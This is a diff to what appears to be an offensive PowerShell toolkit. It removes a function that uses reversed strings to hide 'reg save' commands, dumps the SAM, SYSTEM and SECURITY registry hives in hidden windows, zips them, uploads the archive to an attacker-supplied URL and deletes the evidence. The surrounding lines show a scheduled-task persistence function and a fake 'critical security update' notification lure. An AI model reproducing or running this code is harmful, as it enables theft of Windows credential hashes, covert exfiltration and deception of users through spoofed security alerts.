@@ -527,39 +527,6 @@ function persistence-tskschld {
 Export-ModuleMember -Function persistence-tskschld 
 Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld 
 
-function dump4mimi-send {
-	    [CmdletBinding()]
-    param (
-        [string]$Value
-        )
-        $atk = $Value
-        $ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(6.0)
-	$ax3 = 'y/ "metsys\:C" "metsys\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(3.5)
-	$ax3 = 'y/ "mas\:C" "mas\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-    clear
-    sleep(1.5)
-    cd C:\
-    Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
-    sleep(0.5)
-    clear
-	Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
-	Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
-	Remove-Item -Path "C:\security" -force -ErrorAction SilentlyContinue
-    clear
-        $d4mPath = "$env:userprofile\d4m.zip"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.UploadFile($atk, $d4mPath) > $null 2>&1
-    sleep(0.3)
-Remove-Item -Path $d4mPath -Force -ErrorAction SilentlyContinue
-}
-Export-ModuleMember -Function dump4mimi-send
-Set-Alias -Name dump4mimi-send -Value dump4mimi-send
-
 # (Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\).PSChildName
 # pop-babylon -over "MSedge" -text "MSedge requires a critical security update" -text2 "Internet access is degraded" -btntext "Dismiss"
 function pop-babylon {
